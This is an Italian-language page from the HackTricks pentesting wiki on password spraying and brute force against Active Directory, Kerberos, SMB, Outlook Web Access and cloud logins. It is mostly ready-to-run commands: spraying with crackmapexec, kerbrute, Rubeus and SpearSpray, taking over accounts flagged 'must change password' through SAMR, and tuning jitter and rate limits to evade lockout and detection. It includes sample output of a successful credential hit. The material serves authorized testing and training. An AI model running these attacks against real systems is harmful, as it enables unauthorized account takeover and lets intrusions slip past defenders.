# Password Spraying / Brute Force

{{#include ../../banners/hacktricks-training.md}}


## **Password Spraying**

Una volta che hai trovato diversi **valid usernames**, puoi provare le **common passwords** più diffuse (tieni presente la password policy dell'ambiente) con ciascuno degli utenti scoperti.  
Per impostazione predefinita la lunghezza minima della **password** è **7**.

Lists of common usernames could also be useful: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)

Nota che potresti bloccare alcuni account se provi diverse **wrong passwords** (di default più di 10).

### Ottieni la password policy

Se hai delle credenziali utente o una shell come domain user puoi **ottenere la password policy con**:
```bash
# From Linux
crackmapexec <IP> -u 'user' -p 'password' --pass-pol

enum4linux -u 'username' -p 'password' -P <IP>

rpcclient -U "" -N 10.10.10.10;
rpcclient $>querydominfo

ldapsearch -h 10.10.10.10 -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# From Windows
net accounts

(Get-DomainPolicy)."SystemAccess" #From powerview
```
### Exploitation da Linux (o tutti)

- Usando **crackmapexec:**
```bash
crackmapexec smb <IP> -u users.txt -p passwords.txt
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
- Usando [**kerbrute**](https://github.com/ropnop/kerbrute) (Go)
```bash
# Password Spraying
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
# Brute-Force
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
```
- [**spray**](https://github.com/Greenwolf/Spray) _**(puoi indicare il numero di tentativi per evitare blocchi):**_
```bash
spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
```
- Usare [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - NON RACCOMANDATO, A VOLTE NON FUNZIONA
```bash
python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
```
- Con il modulo `scanner/smb/smb_login` di **Metasploit**:

![](<../../images/image (745).png>)

- Usando **rpcclient**:
```bash
# https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
for u in $(cat users.txt); do
rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
done
```
#### Da Windows

- Con la versione di [Rubeus](https://github.com/Zer1t0/Rubeus) con il modulo brute:
```bash
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```
- Con [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (Può generare utenti dal dominio per impostazione predefinita e ottiene i criteri delle password dal dominio, limitando i tentativi in base a essi):
```bash
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
```
- Con [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)
```
Invoke-SprayEmptyPassword
```
### Identificare e Prendere il Controllo degli Account "Password must change at next logon" (SAMR)

Una tecnica a basso impatto è sprayare una benign/empty password e intercettare gli account che restituiscono STATUS_PASSWORD_MUST_CHANGE, il che indica che la password è stata forzatamente scaduta e può essere cambiata senza conoscere quella precedente.

Workflow:
- Enumerare gli utenti (RID brute via SAMR) per costruire la lista di target:

{{#ref}}
../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md
{{#endref}}
```bash
# NetExec (null/guest) + RID brute to harvest users
netexec smb <dc_fqdn> -u '' -p '' --rid-brute | awk -F'\\\\| ' '/SidTypeUser/ {print $3}' > users.txt
```
- Esegui password spraying con una password vuota e continua sui risultati per catturare gli account che devono cambiare la password al prossimo accesso:
```bash
# Will show valid, lockout, and STATUS_PASSWORD_MUST_CHANGE among results
netexec smb <DC.FQDN> -u users.txt -p '' --continue-on-success
```
- Per ogni hit, cambia la password via SAMR usando il modulo di NetExec (non è necessaria la password vecchia quando "must change" è impostato):
```bash
# Strong complexity to satisfy policy
env NEWPASS='P@ssw0rd!2025#' ; \
netexec smb <DC.FQDN> -u <User> -p '' -M change-password -o NEWPASS="$NEWPASS"

# Validate and retrieve domain password policy with the new creds
netexec smb <DC.FQDN> -u <User> -p "$NEWPASS" --pass-pol
```
Note operative:
- Assicurati che l'orologio della tua macchina sia sincronizzato con il DC prima delle operazioni basate su Kerberos: `sudo ntpdate <dc_fqdn>`.
- Un [+] senza (Pwn3d!) in alcuni moduli (ad es., RDP/WinRM) significa che le creds sono valide ma l'account non ha i diritti di accesso interattivo.

## Brute Force
```bash
legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
```
### Kerberos pre-auth spraying con targeting LDAP e throttling consapevole di PSO (SpearSpray)

Lo spraying basato su Kerberos pre-auth riduce il rumore rispetto ai tentativi di bind SMB/NTLM/LDAP e si allinea meglio con le policy di lockout di AD. SpearSpray combina il targeting guidato da LDAP, un motore di pattern e la consapevolezza delle policy (domain policy + PSOs + badPwdCount buffer) per eseguire lo spray in modo preciso e sicuro. Può anche taggare i principal compromessi in Neo4j per il pathing di BloodHound.

Concetti chiave:
- Discovery utenti LDAP con paging e supporto LDAPS, opzionalmente usando filtri LDAP personalizzati.
- Domain lockout policy + PSO-aware filtering per lasciare un buffer configurabile di tentativi (soglia) e evitare di bloccare gli utenti.
- Validazione Kerberos pre-auth usando binding gssapi veloci (genera 4768/4771 sui DC invece di 4625).
- Generazione password basata su pattern, per utente, usando variabili come nomi e valori temporali derivati dal pwdLastSet di ciascun utente.
- Controllo del throughput con threads, jitter e massimo di richieste al secondo.
- Integrazione opzionale con Neo4j per marcare gli utenti compromessi per BloodHound.

Uso e discovery di base:
```bash
# List available pattern variables
spearspray -l

# Basic run (LDAP bind over TCP/389)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local

# LDAPS (TCP/636)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local --ssl
```
Selezione degli obiettivi e controllo dei pattern:
```bash
# Custom LDAP filter (e.g., target specific OU/attributes)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local \
-q "(&(objectCategory=person)(objectClass=user)(department=IT))"

# Use separators/suffixes and an org token consumed by patterns via {separator}/{suffix}/{extra}
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -sep @-_ -suf !? -x ACME
```
Controlli di stealth e sicurezza:
```bash
# Control concurrency, add jitter, and cap request rate
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -t 5 -j 3,5 --max-rps 10

# Leave N attempts in reserve before lockout (default threshold: 2)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -thr 2
```
Neo4j/BloodHound arricchimento:
```bash
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -nu neo4j -np bloodhound --uri bolt://localhost:7687
```
Panoramica del sistema di pattern (patterns.txt):
```text
# Example templates consuming per-user attributes and temporal context
{name}{separator}{year}{suffix}
{month_en}{separator}{short_year}{suffix}
{season_en}{separator}{year}{suffix}
{samaccountname}
{extra}{separator}{year}{suffix}
```
Available variables include:
- {name}, {samaccountname}
- Temporal from each user’s pwdLastSet (or whenCreated): {year}, {short_year}, {month_number}, {month_en}, {season_en}
- Composition helpers and org token: {separator}, {suffix}, {extra}

Operational notes:
- Privilegiare le query al PDC-emulator con -dc per leggere il badPwdCount più autorevole e le informazioni relative alle policy.
- I reset di badPwdCount vengono attivati al tentativo successivo dopo la finestra di osservazione; usa soglia e temporizzazione per rimanere al sicuro.
- I tentativi di pre-auth Kerberos si manifestano come 4768/4771 nella telemetry del DC; usa jitter e rate-limiting per mimetizzarti.

> Suggerimento: la dimensione predefinita della pagina LDAP di SpearSpray è 200; regola con -lps se necessario.

## Outlook Web Access

Esistono diversi strumenti per p**assword spraying outlook**.

- Con [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/)
- con [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
- With [Ruler](https://github.com/sensepost/ruler) (affidabile!)
- With [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
- With [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)

Per usare uno di questi strumenti, ti serve una lista di utenti e una password — o una piccola lista di password — da usare per il password spraying.
```bash
./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
[x] Failed: larsson:Summer2020
[x] Failed: cube0x0:Summer2020
[x] Failed: a.admin:Summer2020
[x] Failed: c.cube:Summer2020
[+] Success: s.svensson:Summer2020
```
## Google

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)

## Okta

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)
- [https://github.com/Rhynorater/Okta-Password-Sprayer](https://github.com/Rhynorater/Okta-Password-Sprayer)
- [https://github.com/knavesec/CredMaster](https://github.com/knavesec/CredMaster)

## Riferimenti

- [https://github.com/sikumy/spearspray](https://github.com/sikumy/spearspray)
- [https://github.com/TarlogicSecurity/kerbrute](https://github.com/TarlogicSecurity/kerbrute)
- [https://github.com/Greenwolf/Spray](https://github.com/Greenwolf/Spray)
- [https://github.com/Hackndo/sprayhound](https://github.com/Hackndo/sprayhound)
- [https://github.com/login-securite/conpass](https://github.com/login-securite/conpass)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
- [https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
- [www.blackhillsinfosec.com/?p=5296](https://www.blackhillsinfosec.com/?p=5296)
- [https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying](https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying)
- [HTB Sendai – 0xdf: from spray to gMSA to DA/SYSTEM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)


{{#include ../../banners/hacktricks-training.md}}
